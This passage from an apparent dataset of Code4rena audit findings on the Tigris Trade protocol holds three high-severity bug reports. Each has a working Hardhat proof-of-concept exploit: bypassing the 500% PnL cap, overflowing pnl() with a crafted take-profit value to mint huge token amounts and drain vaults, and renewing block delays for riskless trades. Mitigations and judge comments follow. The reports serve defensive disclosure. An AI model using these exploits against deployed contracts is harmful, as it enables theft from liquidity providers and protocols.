+157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         _burn(_id);\n         emit Release(asset, lockAmount, _owner, _id);\n     }\n+\n     /**\n-     * @notice Claim rewards from a bond\n+     * @notice Claim rewards from an unex",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/170",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "__141345__",
        "hihen",
        "hansfriese",
        "unforgiven",
        "rvierdiiev"
      ]
    },
    {
      "id": "6323",
      "title": "[H-04] Bypass the maximum PnL check to take extra profit",
      "impact": "HIGH",
      "content": "\nTo protect the fund of vault, the protocol has a security mechanism which limits:\n\n    Maximum PnL is +500%. \n\nsource: <https://docs.tigris.trade/protocol/trading-and-fees#limitations>\n\nBut the implementation is missing to check this limitation while `addToPosition()`, an attacker can exploit it to get more profit than expected.\n\n### Proof of Concept\n\nThe following test case shows both normal case and the exploit scenario.\n\nIn the normal case,  a 990 USD margin, gets back a 500% of 4950 USD payout, and the profit is 3960 USD.\n\nIn the exploit case, the attack will get an extra 2600+ USD profit than the normal case.\n\n```\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Design Specification: Maximum PnL is +500%\", function () {\n\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Bypass the maximum PnL check to take extra profit\", function () {\n    let orderId;\n    let closePriceData;\n    let closeSig;\n    let initPrice = parseEther(\"1000\");\n    let closePrice = parseEther(\"2000\");\n    beforeEach(async function () {\n      let maxWin = await trading.maxWinPercent();\n      expect(maxWin.eq(5e10)).to.equal(true);\n\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);\n\n      // Some time later\n      await network.provider.send(\"evm_setNextBlockTimestamp\", [2000001000]);\n      await network.provider.send(\"evm_mine\");\n      \n      // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900\n      closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, closePrice, 0, 2000001000, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n\n    });\n\n    it.only(\"All profit is $9900, close the order normally, only get $3960 profit\", async function () {\n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let marginAfterFee = parseEther(\"990\");\n      let payout = balanceAfter.sub(balanceBefore);\n      expect(payout.eq(parseEther(\"4950\"))).to.be.true;\n\n      let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);\n      expect(profit.eq(parseEther(\"3960\"))).to.be.true;\n\n    });\n\n    it.only(\"All profit is $9900, bypass the PnL check to take extra $2600 profit\", async function () {\n      // We increase the possition first rather than closing the profit order directly\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      let extraMargin = parseEther(\"1000\");\n      await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      // 60 secs later\n      await network.provider.send(\"evm_setNextBlockTimestamp\", [2000001060]);\n      await network.provider.send(\"evm_mine\");\n  \n      // Now we close the order to take all profit\n      closePriceData = [node.address, 1, closePrice, 0, 2000001060, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, closePrice, 0, 2000001060, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n\n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let marginAfterFee = parseEther(\"990\").add(extraMargin.mul(990).div(1000));\n      let originalProfit = parseEther(\"3960\");\n      let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);\n      expect(extraProfit.gt(parseEther('2600'))).to.be.true;\n    });\n\n  });\n});\n\n\n```\n\nThe test result\n\n     Design Specification: Maximum PnL is +500%\n        Bypass the maximum PnL check to take extra profit\n          √ All profit is $9900, close the order normally, only get $3960 profit\n          √ All profit is $9900, bypass the PnL check to take extra $2600 profit\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nAdd a check for `addToPosition()` function, revert if PnL >= 500%, enforce users to close the order to take a limited profit.\n\n**[TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1364943872):**\n > It is valid but I think it should be Medium risk as it needs +500% win to happen so assets are not in a direct risk, need a judge opinion on this.\n\n**[KingNFT (warden) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1378270756):**\n > As the max leverages are 100x for crypto pairs and 500x for forex pairs, so 5% price change on crypto pairs or 1% on forex pairs lead to 500% profit. I think it would be frequent to see +500% win happening.\n> \n> In my personal opinion, the ````500%```` security design is a base and important feature to protect fund safety of stakers, this bug causes the feature almost not working. Maybe it deserves a high severity.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1383720303):**\n > The Warden has shown how, because of a lack of checks, an attacker could bypass the PNL cap and extract more value than intended.\n> \n> While the condition of having a price movement of 500% can be viewed as external, I believe that in this specific case we have to exercise more nuance.\n> \n> An attacker could setup a contract to perform the sidestep only when favourable, meaning that while the condition may not always be met, due to volatility of pricing there always is a % (can be viewed as a poisson distribution) that a PNL bypass would favour the attacker.\n> \n> Additionally, after the [CRV / AVI attack](https://chaindebrief.com/how-manipulation-on-aave-and-curve-went-wrong-attacker-got-rekted-instead/) we have pretty strong evidence that any +EV scenario can be exploited as long as the payout is high enough.\n> \n> As such I believe that the finding doesn't truly rely on an external condition.\n> \n> For this reason, as well as knowing that the value extracted will be paid by LPs / the Protocol, I believe High Severity to be the most appropriate\n\n**[GainsGoblin (Tigris Trade) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/111#issuecomment-1407134511):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173887 \n >\n> Implemented something similar to this report's recommended mitigation, where if PnL is >= maxPnl%-100%, then addToPosition, addMargin and removeMargin revert.\n\n\n\n***\n\n",
      "summary": "\nThis bug report deals with a vulnerability in the code of the Tigris Protocol, which is a decentralized trading protocol. The vulnerability relates to the security mechanism that is supposed to limit the maximum PnL to 500%. In the proof of concept, it is demonstrated that an attacker can exploit this vulnerability to get more profit than expected.\n\nThe tools used in the bug report were VS Code. The recommended mitigation step is to add a check for the addToPosition() function, which should revert if the PnL is greater than or equal to 500%. This would enforce users to close the order to take a limited profit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/111",
      "tags": [],
      "finders": [
        "KingNFT"
      ]
    },
    {
      "id": "6322",
      "title": "[H-03] Certain fee configuration enables vaults to be drained",
      "impact": "HIGH",
      "content": "\nAn overflow in `TradingLibrary.pnl()` enables all funds from the vault contracts to be drained given a certain fee configuration is present.\n\n### Detailed exploit process description\n\nWhen opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. Setting this value specifically to attack the vault leads to the `Trading` contract minting a huge (in the example below `10^36`) Tigris tokens, which can then be given to the vault to withdraw assets.\n\nThe exploiter starts by setting himself as referrer, in order to later receive the referrer fees.\n\nThe next step is to open a short position at the current market price by calling `initiateLimitOrder()`. Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be `115792089237316195423570985008687907854269984665640564039467` for this specific market price, leverage and margin.\n\nThe order is then immediately executed through `executeLimitOrder()`.\n\nThe final step is to close the order through `limitClose()`, which will then mint over `10^36` Tigris tokens to the attacker.\n\n### Detailed bug description\n\nThe bug takes place in `TradingLibrary.pnl()`, line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as `_currentPrice` and the order's original opening price is passed as `_price`. The take-profit has been specifically calculated so that `1e18 * _currentPrice / _price - 1e18` results in `0`, meaning `_payout = _margin` (`accInterest` is negligible for this PoC).\nLine 48 then calculates the position size. Margin and leverage have been chosen so that `_initPositionSize * _currentPrice` does not overflow, resulting in a huge `_positionSize` which is returned from the function.\n\nLater, `Trading._handleCloseFees()` is called, under the condition that `_payout > 0`, which is why the overflow had to be calculated so precisely, as to not subtract from the `_payout` but still create a large `_positionSize`. `_positionSize` is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be `daoFees = 2*referralFees` -- not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge `referralFees` are directly minted and not included in the calculation in line 805.\n\n### Recommended Mitigation Steps\n\nThe core issue is that the arithmetic in `TradingLibrary.pnl()` overflows. I recommend removing the `unchecked` block.\n\n### Proof of Concept\n\nInsert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`:\n\n```javascript\ndescribe(\"PoC\", function () {\n    it.only(\"PoC\", async function () {\n      // Setup token balances and approvals\n      const mockDAI = await ethers.getContractAt(\"MockERC20\", MockDAI.address)\n      await mockDAI.connect(owner).transfer(user.address, parseEther(\"10000\"))\n      await mockDAI.connect(user).approve(trading.address, parseEther(\"10000\"))\n      const permitData = [\n        \"0\",\n        \"0\",\n        \"0\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        false\n      ]\n\n      // Create referral code\n      await referrals.connect(user).createReferralCode(ethers.constants.HashZero)\n\n      // Set the fees\n      await trading.connect(owner).setFees(\n        false,        // close\n        \"200000000\",  // dao  \n        \"0\",          // burn\n        \"100000000\",  // referral\n        \"0\",          // bot\n        \"0\",          // percent\n      )\n\n\n      // ============================================================== //\n      // =================== Create the limit order =================== //\n      // ============================================================== //\n      const tradeInfo = [\n        parseEther(\"1\"),          // margin amount\n        MockDAI.address,          // margin asset\n        StableVault.address,      // stable vault\n        parseEther(\"2\"),          // leverage\n        0,                        // asset id\n        false,                    // direction (short)\n        \"115792089237316195423570985008687907854269984665640564039467\",          // take profit price\n        parseEther(\"0\"),       // stop loss price\n        ethers.constants.HashZero // referral (ourself)\n      ];\n\n      // Create the order\n      await trading.connect(user).initiateLimitOrder(\n        tradeInfo,            // trade info\n        1,                    // order type (limit)\n        parseEther(\"1000\"),   // price\n        permitData,           // permit\n        user.address          // trader\n      )\n\n\n      // ============================================================== //\n      // =================== Execute the limit order ================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      await network.provider.send(\"evm_mine\")\n\n      // Create the price data\n      let priceData = [\n        node.address,                                   // provider\n        0,                                              // asset id\n        parseEther(\"1000\"),                             // price\n        10000000,                                       // spread (0.1%)\n        (await ethers.provider.getBlock()).timestamp,   // timestamp\n        false                                           // is closed\n      ]\n\n      // Sign the price data\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      )\n\n      // Execute the limit order\n      await trading.connect(user).executeLimitOrder(1, priceData, sig);\n\n\n\n\n\n      // ============================================================== //\n      // ======================== Close order  ======================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      await network.provider.send(\"evm_mine\")\n\n      // Close order\n      await trading.connect(user).limitClose(\n        1,          // id\n        true,       // take profit\n        priceData,  // price data\n        sig,        // signature\n      )\n\n      // Print results\n      const amount = await stabletoken.balanceOf(user.address)\n      const tenPow18 = \"1000000000000000000\"\n      console.log(`StableToken balance at end: ${(amount / tenPow18).toString()}`)\n    })\n})\n```\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/86)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/86#issuecomment-1399443161):**\n > In contrast to other reports that have some ambiguity, this report has shown a way to undercollateralize the vault and steal effectively all value.\n>\n > The Warden has shown how, by leveraging `unchecked` math and using injected-inputs, it's possible to effectively mint an infinite amount of Stable Tokens.\n> \n> Mitigation will require ensuring that user provided inputs do not allow for overflows.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/86#issuecomment-1407133086):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173668\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `TradingLibrary.pnl()` function which enables all funds from the vault contracts to be drained given a certain fee configuration is present. When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. If a malicious value is passed in, the arithmetic in the function can overflow and result in a huge `_positionSize` which is returned from the function. This can then be used to calculate DAO and referral fees and mint huge referral fees.\n\nThe recommended mitigation for this bug is to remove the `unchecked` block from the `TradingLibrary.pnl()` function. A proof-of-concept code is also included in the report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/86",
      "tags": [],
      "finders": [
        "Bobface"
      ]
    },
    {
      "id": "6321",
      "title": "[H-02] Riskless trades due to delay check",
      "impact": "HIGH",
      "content": "\n`Trading.limitClose()` uses `_checkDelay()`. This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.\n\n### Detailed description\n\nA malicious trader can exploit the `Trading` contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.\n\nThe exploit is based on three principles:\n\n1.  The stop-loss of a position can be updated without any delay checks, due to `_checkDelay()` not being called in `updateTpSl()`\n2.  Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to `limitClose` calling `_checkDelay()`\n3.  The block delay can be continuously renewed for a negligible cost\n\n**Based on these three principles, the following method can be used to perform riskless trades:**\nAssuming a current market price of 1,000 DAI, begin by opening a long limit order through `initiateLimitOrder()` at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through `executeLimitOrder`.\n\nAfter the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call `limitClose`. However, we can prevent them from doing so by continuously calling `addToPosition` with 1 wei when the block delay comes close to running out *\\[1]*, which will renew the delay and thus stops `limitClose` from being called.\n\nWhile the trader keeps renewing the delay to stop his position from being closed, he watches the price development:\n\n*   If the price goes **down**, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through `liquidatePosition()`. If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again.\n*   If the price goes **up**, the trader calls `updateTpSl()` to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls `updateTpSl()` with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to `_checkDelay()`.\n\nThe trader keeps calling `updateTpSl()` when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls `limitClose()` to close the order at the peak stop-loss.\n\n*Notes*\n*\\[1]*: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to `addToPosition` after every few transactions on the chain. However, `block.number`, which is used by the contract, actually returns the L1 block number and not the L2 block number.\n\n### Recommended Mitigation Steps\n\nThe core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in `limitClose()` should be modified to also consider whether the position is below the stop-loss.\n\n### Proof of Concept\n\nInsert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`:\n\n```javascript\ndescribe(\"PoC\", function () {\n    it.only(\"PoC\", async function () {\n      // Setup token balances and approvals\n      const mockDAI = await ethers.getContractAt(\"MockERC20\", MockDAI.address)\n      await mockDAI.connect(owner).transfer(user.address, parseEther(\"10000\"))\n      await mockDAI.connect(owner).transfer(stablevault.address, parseEther(\"100000\"))\n      await mockDAI.connect(user).approve(trading.address, parseEther(\"10000\"))\n      const daiAtBeginning = await mockDAI.balanceOf(user.address)\n      const permitData = [\n        \"0\",\n        \"0\",\n        \"0\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        false\n      ]\n\n      // Setup block delay to 5 blocks\n      const blockDelay = 5;\n      await trading.connect(owner).setBlockDelay(blockDelay)\n\n\n\n\n      // ============================================================== //\n      // =================== Create the limit order =================== //\n      // ============================================================== //\n      const tradeInfo = [\n        parseEther(\"9000\"),       // margin amount\n        MockDAI.address,          // margin asset\n        StableVault.address,      // stable vault\n        parseEther(\"2\"),          // leverage\n        0,                        // asset id\n        true,                     // direction (long)\n        parseEther(\"0\"),          // take profit price\n        parseEther(\"1000\"),       // stop loss price\n        ethers.constants.HashZero // referral\n      ];\n\n      // Create the order\n      await trading.connect(user).initiateLimitOrder(\n        tradeInfo,            // trade info\n        1,                    // order type (limit)\n        parseEther(\"1000\"),   // price\n        permitData,           // permit\n        user.address          // trader\n      )\n\n\n\n      // ============================================================== //\n      // =================== Execute the limit order ================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      for (let n = 0; n < blockDelay; n++) {\n        await network.provider.send(\"evm_mine\")\n      }\n\n      // Create the price data (the price hasn't changed)\n      let priceData = [\n        node.address,                                   // provider\n        0,                                              // asset id\n        parseEther(\"1000\"),                             // price\n        10000000,                                       // spread (0.1%)\n        (await ethers.provider.getBlock()).timestamp,   // timestamp\n        false                                           // is closed\n      ]\n\n      // Sign the price data\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      )\n\n      // Execute the limit order\n      await trading.connect(user).executeLimitOrder(1, priceData, sig);\n\n\n\n\n\n\n      // ============================================================== //\n      // ================== Block bots from closing =================== //\n      // ============================================================== //\n\n      for (let i = 0; i < 5; i++) {\n\n        /*\n          This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.\n          We constantly add 1 wei to the position when the delay is close to running out.\n          This won't change anything about our position, but it will reset the delay timer,\n          stopping bots from calling `limitClose()`. \n\n          This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.\n          And if the price rises, we can push the stop loss higher to keep profits.\n\n          The loop runs five times just to demonstrate. In reality, this could be done as long as needed.\n        */\n\n\n        // Blocks advanced to one block before the delay would pass\n        await network.provider.send(\"evm_increaseTime\", [10])\n        for (let n = 0; n < blockDelay - 1; n++) {\n          await network.provider.send(\"evm_mine\")\n        }\n\n\n\n\n        // ============================================================== //\n        // =========== Add 1 wei to position (price is down)  =========== //\n        // ============================================================== //\n\n        // Increase delay by calling addToPosition with 1 wei\n        // Create the price data\n        priceData = [\n          node.address,                                   // provider\n          0,                                              // asset id\n          parseEther(\"900\"),                              // price\n          10000000,                                       // spread (0.1%)\n          (await ethers.provider.getBlock()).timestamp,   // timestamp\n          false                                           // is closed\n        ]\n\n        // Sign the price data - \n        message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n          )\n        );\n        sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        )\n\n        // Add to position\n        await trading.connect(user).addToPosition(\n          1,\n          \"1\",\n          priceData,\n          sig,\n          stablevault.address,\n          MockDAI.address,\n          permitData,\n          user.address,\n        )\n\n\n\n        // ============================================================== //\n        // ====================== Bots cannot close ===================== //\n        // ============================================================== //\n\n        // Bots cannot close the position even if the price is down below the stop loss\n        await expect(trading.connect(user).limitClose(\n          1,          // id\n          false,      // take profit\n          priceData,  // price data\n          sig,        // signature\n        )).to.be.revertedWith(\"0\") // checkDelay\n\n        // They can also not liquidate the position because the price is not down enough\n        // If the price falls close to the liquidation zone, we can add more margin or simply close\n        // the position, netting us the stop-loss price.\n        await expect(trading.connect(user).liquidatePosition(\n          1,          // id\n          priceData,  // price data\n          sig,        // signature\n        )).to.be.reverted\n\n\n\n\n        // ============================================================== //\n        // =============== Increase SL when price is up  ================ //\n        // ============================================================== //\n\n        // Sign the price data (price has 5x'ed from initial price)\n        priceData = [\n          node.address,                                   // provider\n          0,                                              // asset id\n          parseEther(\"5000\"),                             // price\n          10000000,                                       // spread (0.1%)\n          (await ethers.provider.getBlock()).timestamp,   // timestamp\n          false                                           // is closed\n        ]\n        message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n          )\n        );\n        sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        )\n\n        // Update stop loss right at the current price\n        await trading.connect(user).updateTpSl(\n          false,                // type (sl)\n          1,                    // id\n          parseEther(\"5000\"),   // sl price\n          priceData,            // price data\n          sig,                  // signature\n          user.address,        // trader\n        )\n      }\n\n\n\n\n\n      // ============================================================== //\n      // ======================== Close order  ======================== //\n      // ============================================================== //\n\n      // When we are happy with the profit, we stop increasing the delay and close the position\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      for (let n = 0; n < blockDelay; n++) {\n        await network.provider.send(\"evm_mine\")\n      }\n\n      // Close order\n      await trading.connect(user).limitClose(\n        1,          // id\n        false,      // take profit\n        priceData,  // price data\n        sig,        // signature\n      )\n\n      // Withdraw to DAI\n      const amount = await stabletoken.balanceOf(user.address)\n      await stablevault.connect(user).withdraw(MockDAI.address, amount)\n\n      // Print results\n      const daiAtEnd = await mockDAI.balanceOf(user.address)\n      const tenPow18 = \"1000000000000000000\"\n      const diff = (daiAtEnd - daiAtBeginning).toString() / tenPow18\n      console.log(`Profit: ${diff} DAI`)\n    })\n})\n```\n\n**[GainsGoblin (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/67)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/67#issuecomment-1383681527):**\n > The warden has shown how, through the combination of: finding a way to re-trigger the delayCheck, altering SL and TP prices, a trader can prevent their position from being closed, creating the opportunity for riskless trades.\n> \n> Because of the broken invariants, and the value extraction shown, I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/67#issuecomment-1407130700):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173125 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Trading` contract that allows for riskless trades. This exploit is based on three principles: the stop-loss of a position can be updated without any delay checks, positions can only be closed after the block delay has been passed, and the block delay can be continuously renewed for a negligible cost.\n\nUsing these principles, a malicious trader can open a long limit order and execute it, then continuously renew the block delay while watching the price development. If the price goes up, they can call `updateTpSl()` to lock in the increased price. If the price goes down, they can prevent the position from being closed by continuously calling `addToPosition` with 1 wei when the block delay comes close to running out. When they have captured enough price movement, they can finally let the delay run out and call `limitClose()` to close the order at the peak stop-loss.\n\nThe recommended mitigation is to modify the delay checking in `limitClose()` to also consider whether the position is below the stop-loss. A proof of concept is provided in the report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/67",
      "tags": [],
      "finders": [
        "Bobface"
      ]
    },
    {
      "id": "6320",
      "title": "[H-01] Lock.sol: assets deposited with Lock.extendLock function are lost",
      "impact": "HIGH",
